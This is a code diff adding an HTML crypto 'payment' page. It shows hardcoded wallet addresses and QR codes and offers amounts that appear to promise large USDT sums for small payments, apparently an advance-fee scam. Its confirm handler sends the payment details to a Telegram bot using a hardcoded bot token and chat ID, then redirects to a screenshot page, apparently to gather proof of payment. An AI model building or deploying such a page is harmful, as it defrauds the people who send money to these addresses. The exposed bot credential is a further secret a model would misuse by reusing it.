@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Payment Info</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      margin: 0;
+      background: url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #000000;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      min-height: 100vh;
+      text-align: center;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(15px);
+      border-radius: 20px;
+      padding: 30px 25px;
+      width: 90%;
+      max-width: 500px;
+      box-shadow: 0 0 20px rgba(0, 188, 212, 0.5);
+      z-index: 1;
+      color: #000;
+    }
+
+    h2, h3 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      font-weight: 700;
+      color: black;
+    }
+
+    select, button {
+      padding: 14px;
+      margin: 15px 0;
+      border-radius: 12px;
+      border: none;
+      width: 100%;
+      font-size: 16px;
+      background-color: #222;
+      color: #fff;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    select:hover, button:hover {
+      background-color: #333;
+    }
+
+    .network-image {
+      width: 120px;
+      margin: 20px auto;
+      filter: drop-shadow(0 0 5px #00bcd4);
+    }
+
+    .qr-image {
+      margin-top: 20px;
+      width: 200px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px #00bcd4;
+    }
+
+    .address-box {
+      background-color: rgba(30, 70, 140, 0.3);
+      padding: 15px;
+      border-radius: 10px;
+      word-break: break-word;
+      font-size: 16px;
+      margin-top: 20px;
+      box-shadow: inset 0 0 10px #00bcd4;
+      color: black;
+    }
+
+    .value-display {
+      font-size: 18px;
+      color: black;
+      margin-top: 10px;
+    }
+
+    #warningText {
+      font-size: 16px;
+      color: #444;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>YOUR PAYMENT NETWORK</h2>
+    <select id="networkSelect" onchange="showPaymentInfo()">
+      <option value="">Select Network</option>
+      <option value="USDT">TETHER BSC (BEP20)</option>
+      <option value="ETH">ETH</option>
+      <option value="Solana">Solana</option>
+      <option value="Trx">Tron</option>
+    </select>
+
+    <div id="paymentInfo" style="display:none;">
+      <img id="networkImage" class="network-image" src="" alt="Network">
+
+      <h3>Choose Amount</h3>
+      <select id="amountSelect" onchange="showValue()">
+        <option value="">Select Amount</option>
+      </select>
+      <div class="value-display" id="valueText"></div>
+
+      <p id="warningText"></p>
+
+      <img id="qrCode" class="qr-image" src="" alt="QR Code">
+
+      <div class="address-box" id="addressText"></div>
+
+      <button onclick="confirmPayment()">Confirm Payment</button>
+      <button onclick="goBack()" style="background-color:#555;">Back</button>
+    </div>
+  </div>
+
+  <script>
+    const addresses = {
+      USDT: "0x9B767999d83651c244D2225A910a3a2456c98a3c",
+      ETH: "0x9B767999d83651c244D2225A910a3a2456c98a3c",
+      Solana: "4JAFP2sYg6GWKfziWR8Y8bxz3RwYDBgE6BVzX9KZkqSg",
+      Trx: "TVrN9wQ2c91fk8xHNBj4MNuSQwjzXZmH2h"
+    };
+
+    const images = {
+      USDT: "bnb.png",
+      ETH: "ethereum.png",
+      Solana: "solana.png",
+      Trx: "tron.png"
+    };
+
+    const amounts = {
+      USDT: [
+        { usdt: "3000", value: "10" },
+        { usdt: "25000", value: "30" },
+        { usdt: "80000", value: "75" },
+        { usdt: "200000", value: "120" }
+      ],
+      ETH: [
+        { usdt: "3000", value: "0.0049" },
+        { usdt: "25000", value: "0.012" },
+        { usdt: "80000", value: "0.030" },
+        { usdt: "200000", value: "0.05" }
+      ],
+      Trx: [
+        { usdt: "3000", value: "37.07" },
+        { usdt: "25000", value: "110.45" },
+        { usdt: "80000", value: "277.7" },
+        { usdt: "200000", value: "443.79" }
+      ],
+      Solana: [
+        { usdt: "3000", value: "0.06" },
+        { usdt: "25000", value: "0.17" },
+        { usdt: "80000", value: "0.43" },
+        { usdt: "200000", value: "0.68" }
+      ]
+    };
+
+    const tokenMap = {
+      USDT: "USDT",
+      ETH: "ETH",
+      Trx: "TRX",
+      Solana: "SOL"
+    };
+
+    const networkMap = {
+      USDT: "BEP20",
+      ETH: "Ethereum",
+      Trx: "Tron",
+      Solana: "Solana"
+    };
+
+    function showPaymentInfo() {
+      const network = document.getElementById("networkSelect").value;
+      if (!network) return;
+
+      document.getElementById("networkImage").src = images[network];
+      document.getElementById("warningText").textContent =
+        network === "USDT"
+          ? "Send using Tether (USDT) on the BEP20 (BSC) network only."
+          : `Send only on the ${networkMap[network]} network.`;
+      document.getElementById("addressText").textContent = addresses[network];
+      document.getElementById("paymentInfo").style.display = "block";
+      document.getElementById("networkSelect").style.display = "none";
+
+      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(addresses[network])}`;
+      document.getElementById("qrCode").src = qrUrl;
+
+      const amountSelect = document.getElementById("amountSelect");
+      amountSelect.innerHTML = '<option value="">Select Amount</option>';
+      amounts[network].forEach(item => {
+        amountSelect.innerHTML += `<option value="${item.value}">${item.usdt} USDT = ${item.value} ${tokenMap[network]}</option>`;
+      });
+
+      document.getElementById("valueText").textContent = "";
+    }
+
+    function showValue() {
+      const amount = document.getElementById("amountSelect").value;
+      const network = document.getElementById("networkSelect").value;
+      const token = tokenMap[network];
+      const networkName = networkMap[network];
+
+      document.getElementById("valueText").textContent = amount
+        ? `You will send: ${amount} ${token} via ${networkName}`
+        : "";
+    }
+
+    function confirmPayment() {
+      const network = document.getElementById("networkSelect").value;
+      const amount = document.getElementById("amountSelect").value;
+      const token = tokenMap[network];
+      const networkName = networkMap[network];
+      const address = addresses[network];
+      const chatId = "7739393558";
+      const botToken = "7575709803:AAEBxGl4NkOrCAvArk1cOLGTxIWcvv1d88w";
+
+      if (!amount || !network) {
+        alert("Please choose network and amount.");
+        return;
+      }
+
+      const msg = `New Payment\nYou will send: ${amount} ${token} via ${networkName}\nAddress: ${address}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: msg })
+      }).then(() => {
+        window.location.href = "screenshot.html";
+      });
+    }
+
+    function goBack() {
+      document.getElementById("paymentInfo").style.display = "none";
+      document.getElementById("networkSelect").style.display = "block";
+      document.getElementById("networkSelect").value = "";
+      document.getElementById("amountSelect").innerHTML = '<option value="">Select Amount</option>';
+      document.getElementById("valueText").textContent = "";
+    }
+  </script>
+</body>
+</html>
